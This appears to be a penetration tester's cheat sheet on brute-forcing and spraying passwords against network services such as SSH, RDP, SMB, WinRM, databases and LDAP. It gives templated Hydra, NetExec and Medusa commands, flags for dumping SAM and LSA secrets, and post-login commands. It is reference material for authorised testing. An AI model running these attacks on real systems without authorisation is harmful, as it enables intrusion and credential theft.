---
created: 2026-09-04
updated: 2026-10-20
---

>[!abstract]+ **Scope**: Remote password brute-forcing and credential spraying against network services; Hydra, NetExec, Medusa syntax per protocol; post-authentication connection commands.

## Brute-forcing network protocols

- Remote password attacks involve guessing or spraying credentials against accessible network services.
- Target these services during external or internal penetration testing to gain initial access or escalate privileges.
- Success depends on password policy configuration and the absence of account lockout mechanisms.

## WinRM

- WinRM (Windows Remote Management) runs on 5985/TCP (HTTP) and 5986/TCP (HTTPS) by default.
- It is Microsoft's implementation of the WS-Management protocol. WinRM provides an HTTP-based interface to WMI operations, which can call DCOM.
- Target WinRM to achieve remote command execution or PowerShell remoting on Windows targets.

>[!note] See [[🛠️ NetExec & CrackMapExec]].

### Hydra

```bash
hydra -L <user_list> -P <password_list> winrm://<target_ip>
```

| Parameter | Description |
| --- | --- |
| `-L` | Path to the username wordlist. Use `-l` for a single username. |
| `-P` | Path to the password wordlist. Use `-p` for a single password. |
| `winrm://` | Specifies the WinRM protocol handler. |

### NetExec

```bash
netexec winrm <target> -u <user_or_list> -p <pass_or_list>
```

| Parameter | Description |
| --- | --- |
| `winrm` | Specifies the WinRM protocol module. |
| `<target>` | Target IP, subnet, or CIDR range. |
| `-u` | Single username or path to a user wordlist. |
| `-p` | Single password or path to a password wordlist. |

### Connecting after a successful brute-force

```bash
evil-winrm -i <target> -u <user> -p <pass>
```

- A successful login initializes a terminal session using the Powershell Remoting Protocol (MS-PSRP).
- Alternatively, use native PowerShell cmdlets like `Invoke-Command` or `Enter-PSSession`.

## SSH

- Secure Shell (SSH) runs on 22/TCP by default.
- Target SSH for interactive command-line access to Linux or Unix systems, and occasionally Windows systems running OpenSSH.

### Hydra

```bash
hydra -L <user_list> -P <password_list> ssh://<target_ip>
```

| Parameter | Description |
| --- | --- |
| `-L` | Path to the username wordlist. Use `-l` for a single username. |
| `-P` | Path to the password wordlist. Use `-p` for a single password. |
| `-t` | Number of parallel threads (default is 16). |
| `-f` | Stop on the first valid credential pair found. |

### NetExec

```bash
netexec ssh <target> -u <user_or_list> -p <pass_or_list>
```

| Parameter | Description |
| --- | --- |
| `ssh` | Specifies the SSH protocol module. |
| `--continue-on-success` | Continue brute-forcing after finding a valid credential pair. |

### Medusa

```bash
medusa -h <target> -U <user_list> -P <pass_list> -M ssh
```

| Parameter | Description |
| --- | --- |
| `-h` | Target IP address. |
| `-U` | Path to the username wordlist. |
| `-P` | Path to the password wordlist. |
| `-M ssh` | Specifies the SSH module. |

### Metasploit

- Module: `auxiliary/scanner/ssh/ssh_login`
- Use this module for rapid credential spraying against SSH services across multiple hosts.

### Connecting after a successful brute-force

```bash
ssh <user>@<target>
```

- Use `ncrack` as an alternative brute-forcing tool: `ncrack -p 22 --user <user> -P <passlist> <target>`

## RDP

- Remote Desktop Protocol (RDP) runs on 3389/TCP by default.
- Target RDP for graphical access to Windows desktop environments.

### Hydra

```bash
hydra -L <user_list> -P <password_list> rdp://<target_ip>
```

| Parameter | Description |
| --- | --- |
| `-L` | Path to the username wordlist. |
| `-P` | Path to the password wordlist. |
| `rdp://` | Specifies the RDP protocol handler. |

### NetExec

```bash
netexec rdp <target> -u <user_or_list> -p <pass_or_list>
```

| Parameter | Description |
| --- | --- |
| `rdp` | Specifies the RDP protocol module. |

### Medusa

```bash
medusa -h <target> -U <user_list> -P <pass_list> -M rdp
```

| Parameter | Description |
| --- | --- |
| `-M rdp` | Specifies the RDP module. |

### Metasploit

- Module: `auxiliary/scanner/rdp/rdp_scanner`
- Note: This is an RDP detection scanner, not a login brute-force tool.

### Connecting after a successful brute-force

>[!note] See [[Connecting via RDP]].

- Another tool for RDP brute-forcing is Crowbar: `crowbar -b rdp -s <target>/32 -u <user> -C <passlist>`

## SMB

- Server Message Block (SMB) runs on 445/TCP and 139/TCP by default.
- Target SMB to enumerate domain information, access file shares, or execute commands via PsExec or WMI.

### Hydra

```bash
hydra -L <user_list> -P <password_list> smb://<target_ip>
```

| Parameter | Description |
| --- | --- |
| `smb://` | Specifies the SMB protocol handler. |

### NetExec

```bash
netexec smb <target> -u <user_or_list> -p <pass_or_list>
```

| Parameter | Description |
| --- | --- |
| `smb` | Specifies the SMB protocol module. |
| `--shares` | Enumerate available SMB shares post-authentication. |
| `--sam` | Dump the SAM database. |
| `--lsa` | Dump LSA secrets. |
| `--local-auth` | Authenticate as a local user instead of a domain user. |

>[!tip]+ `Pwn3d!` output in NetExec indicates the credentials belong to a local administrator.

### Medusa

```bash
medusa -h <target> -U <user_list> -P <pass_list> -M smbnt
```

| Parameter | Description |
| --- | --- |
| `-M smbnt` | Specifies the SMB module. |

### Metasploit

- Module: `auxiliary/scanner/smb/smb_login`
- Tests SMB logins across multiple targets.

### Connecting after a successful brute-force

```bash
smbclient -U <user> \\\\<target>\\<share>
```

- List shares using NetExec: `netexec smb <target> -u <user> -p <pass> --shares`
- Use `smbmap` for share enumeration: `smbmap -H <target> -u <user> -p <pass>`

## FTP

- File Transfer Protocol (FTP) runs on 21/TCP by default.
- Target FTP to find sensitive files, backups, or application configurations.

### Hydra

```bash
hydra -L <user_list> -P <password_list> ftp://<target_ip>
```

| Parameter | Description |
| --- | --- |
| `ftp://` | Specifies the FTP protocol handler. |
| `-e nsr` | Try null, same, and reverse passwords automatically. |

### NetExec

```bash
netexec ftp <target> -u <user_or_list> -p <pass_or_list>
```

| Parameter | Description |
| --- | --- |
| `ftp` | Specifies the FTP protocol module. |

### Medusa

```bash
medusa -h <target> -U <user_list> -P <pass_list> -M ftp
```

| Parameter | Description |
| --- | --- |
| `-M ftp` | Specifies the FTP module. |

### Metasploit

- Module: `auxiliary/scanner/ftp/ftp_login`
- Metasploit anonymous: `auxiliary/scanner/ftp/anonymous`

### Connecting after a successful brute-force

```bash
ftp <target>
```

- For anonymous login, use `anonymous` as the username and leave the password blank or use an email address.

## MSSQL

- Microsoft SQL Server runs on 1433/TCP by default.
- Target MSSQL to execute operating system commands via `xp_cmdshell` or extract database contents.

### Hydra

```bash
hydra -L <user_list> -P <password_list> mssql://<target_ip>
```

| Parameter | Description |
| --- | --- |
| `mssql://` | Specifies the MSSQL protocol handler. |

### NetExec

```bash
netexec mssql <target> -u <user_or_list> -p <pass_or_list>
```

| Parameter | Description |
| --- | --- |
| `mssql` | Specifies the MSSQL protocol module. |

### Medusa

```bash
medusa -h <target> -U <user_list> -P <pass_list> -M mssql
```

| Parameter | Description |
| --- | --- |
| `-M mssql` | Specifies the MSSQL module. |

### Metasploit

- Module: `auxiliary/scanner/mssql/mssql_login`
- Brute-force MSSQL credentials.

### Connecting after a successful brute-force

```bash
impacket-mssqlclient <user>:<pass>@<target> -windows-auth
```

- The `-windows-auth` flag enforces Windows authentication.

## MySQL

- MySQL runs on 3306/TCP by default.
- Target MySQL to dump tables, read local files, or extract application credentials.

### Hydra

```bash
hydra -L <user_list> -P <password_list> mysql://<target_ip>
```

| Parameter | Description |
| --- | --- |
| `mysql://` | Specifies the MySQL protocol handler. |

### Medusa

```bash
medusa -h <target> -U <user_list> -P <pass_list> -M mysql
```

| Parameter | Description |
| --- | --- |
| `-M mysql` | Specifies the MySQL module. |

### Metasploit

- Module: `auxiliary/scanner/mysql/mysql_login`
- Brute-force MySQL logins.

### Connecting after a successful brute-force

```bash
mysql -h <target> -u <user> -p
```

- Enter the password at the prompt to connect.

## SMTP / IMAP / POP3

- SMTP runs on 25/TCP, IMAP on 143/TCP (993/TCP for SSL), and POP3 on 110/TCP (995/TCP for SSL) by default.
- Target mail protocols to access sensitive emails, password resets, or enumerate users.

### Hydra

```bash
hydra -L <user_list> -P <password_list> smtp://<target_ip>
```

| Parameter | Description |
| --- | --- |
| `smtp://` | Specifies the SMTP protocol handler. Replace with `imap://` or `pop3://` as needed. |

### Medusa

```bash
medusa -h <target> -U <user_list> -P <pass_list> -M smtp
```

| Parameter | Description |
| --- | --- |
| `-M smtp` | Specifies the SMTP module. Replace with `imap` or `pop3` as needed. |

### Enumerating users

```bash
smtp-user-enum -M VRFY -U <userlist> -t <target>
```

- Use `smtp-user-enum` for VRFY, EXPN, or RCPT enumeration against SMTP services.

## SNMP

- Simple Network Management Protocol (SNMP) runs on 161/UDP by default.
- Target SNMP to enumerate network devices, running processes, routing tables, and sometimes plaintext credentials.

### Hydra

```bash
hydra -P <community_list> <target> snmp
```

| Parameter | Description |
| --- | --- |
| `-P` | Path to the community string wordlist. |
| `snmp` | Specifies the SNMP protocol handler. |

### Connecting after a successful brute-force

```bash
snmpwalk -v2c -c <community_string> <target>
```

- Alternatively, use `onesixtyone` for community string guessing: `onesixtyone -c <community_list> <target>`

## LDAP

- Lightweight Directory Access Protocol (LDAP) runs on 389/TCP, and LDAPS on 636/TCP by default.
- Target LDAP to enumerate Active Directory domains, users, groups, and service principal names.

### NetExec

```bash
netexec ldap <target> -u <user_or_list> -p <pass_or_list>
```

| Parameter | Description |
| --- | --- |
| `ldap` | Specifies the LDAP protocol module. |

### Connecting after a successful brute-force

```bash
ldapsearch -H ldap://<target> -D '<user>@<domain>' -w '<pass>' -b 'DC=example,DC=com'
```

- Use `ldapsearch` to query the directory natively.

>[!note] See also [[🛠️ Custom wordlists and rules]] and [[Hashcat]].

## References and further reading

- [`Hydra — GitHub`](https://github.com/vanhauser-thc/thc-hydra)
- [`NetExec docs`](https://www.netexec.wiki/)
- [`Medusa — GitHub`](https://github.com/jmk-foofus/medusa)
- [`Evil-WinRM — GitHub`](https://github.com/Hackplayers/evil-winrm)
- [`Brute Force — HackTricks`](https://hacktricks.wiki/en/generic-methodologies-and-resources/brute-force.html)

